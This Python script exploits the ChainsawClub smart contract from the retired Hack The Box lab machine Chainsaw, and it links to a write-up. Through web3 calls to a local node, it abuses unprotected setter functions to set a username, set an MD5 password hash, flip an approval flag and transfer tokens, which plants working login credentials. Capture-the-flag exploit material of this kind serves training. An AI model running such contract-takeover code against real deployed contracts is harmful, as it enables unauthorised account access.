#!/usr/bin/python3
import json
from web3 import Web3, eth
from sys import argv
from hashlib import md5

'''
Write-up: https://0xrick.github.io/hack-the-box/chainsaw/
Description: Exploit for the smart contract ChainsawClub from Hack The Box retired machine Chainsaw. 
'''

YELLOW = "\033[93m"
GREEN = "\033[32m"

def exploit(address, username, password, passhash):
	print(YELLOW + "[+] Starting")
	print(YELLOW + "[+] Connecting to localhost:63991")
	w3 = Web3(Web3.HTTPProvider('http://localhost:63991'))
	print(GREEN + "[*] Connection Established")
	w3.eth.defaultAccount = w3.eth.accounts[0]
	print(YELLOW + "[+] Creating the contract representation")
	print(YELLOW + "[+] Address: {}".format(address))
	abi = json.loads('[ { "constant": true, "inputs": [], "name": "getBalance", "outputs": [ { "name": "", "type": "uint256" } ], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [ { "name": "_value", "type": "uint256" } ], "name": "transfer", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [ { "name": "_value", "type": "string" } ], "name": "setPassword", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getUsername", "outputs": [ { "name": "", "type": "string" } ], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "getSupply", "outputs": [ { "name": "", "type": "uint256" } ], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "getApprove", "outputs": [ { "name": "", "type": "bool" } ], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [ { "name": "_value", "type": "bool" } ], "name": "setApprove", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getPassword", "outputs": [ { "name": "", "type": "string" } ], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "reset", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [ { "name": "_value", "type": "string" } ], "name": "setUsername", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" } ]')
	contract = w3.eth.contract(address=address, abi=abi)
	print(GREEN + "[*] Done")
	print(YELLOW + "[+] Calling setUsername() with: {}".format(username))
	contract.functions.setUsername(username).transact()
	print(GREEN + "[*] Done. getUsername(): " + contract.functions.getUsername().call())
	print(YELLOW + "[+] Calling setPassword() with: {} ({})".format(passhash, password))
	contract.functions.setPassword(passhash).transact()
	print(GREEN + "[*] Done. getPassword(): " + contract.functions.getPassword().call())
	print(YELLOW + "[+] Calling setApprove() with: True")
	contract.functions.setApprove(True).transact()
	print(GREEN + "[*] Done. getApprove(): " + str(contract.functions.getApprove().call()))
	print(YELLOW + "[+] Calling transfer() with: 1000")
	contract.functions.transfer(1000).transact()
	print(GREEN + "[*] Done. getBalance(): " + str(contract.functions.getBalance().call()))
	print(GREEN + "[+] Exploit finished. Now you can login with the provided credentials: {}:{}, Exiting...".format(username,password))
	exit()

if len(argv) != 4:
	print(YELLOW + "[!] Usage: {} [contract address] [username] [password]".format(argv[0]))
	exit()
else:
	address = argv[1]
	username = argv[2]
	password = argv[3]
	passhash = md5(password.encode('utf-8')).hexdigest()
	exploit(address, username, password, passhash)